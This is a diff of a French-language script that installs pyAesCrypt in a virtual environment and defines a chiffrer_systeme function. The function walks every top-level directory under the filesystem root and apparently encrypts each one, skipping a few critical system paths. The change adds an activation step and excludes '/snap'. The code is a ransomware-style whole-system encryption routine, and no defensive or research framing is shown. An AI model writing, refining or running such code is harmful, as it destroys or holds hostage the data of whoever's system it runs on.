@@ -11,6 +11,8 @@ sudo apt install python3-venv -y
 
 echo "=== CREATION DE L'ENVIRONNEMENT VIRTUEL ==="
 python3 -m venv env
+
+echo "=== ACTIVATION DE L'ENVIRONNEMENT VIRTUEL ==="
 source env/bin/activate
 
 echo "=== INSTALLATION DE pyAesCrypt ==="
@@ -61,7 +63,7 @@ def chiffrer_dossier(dossier_source):
 # Fonction principale
 def chiffrer_systeme():
     # Parcourir tous les dossiers racine sauf ceux critiques
-    exclusions = ["/proc", "/sys", "/dev", "/run", "/tmp", "/boot", "/mnt", "/media"]
+    exclusions = ["/proc", "/sys", "/dev", "/run", "/tmp", "/boot", "/mnt", "/media", "/snap"]
     for dossier in os.listdir("/"):
         chemin_dossier = os.path.join("/", dossier)
         # Vérifier si c'est un dossier et non exclu
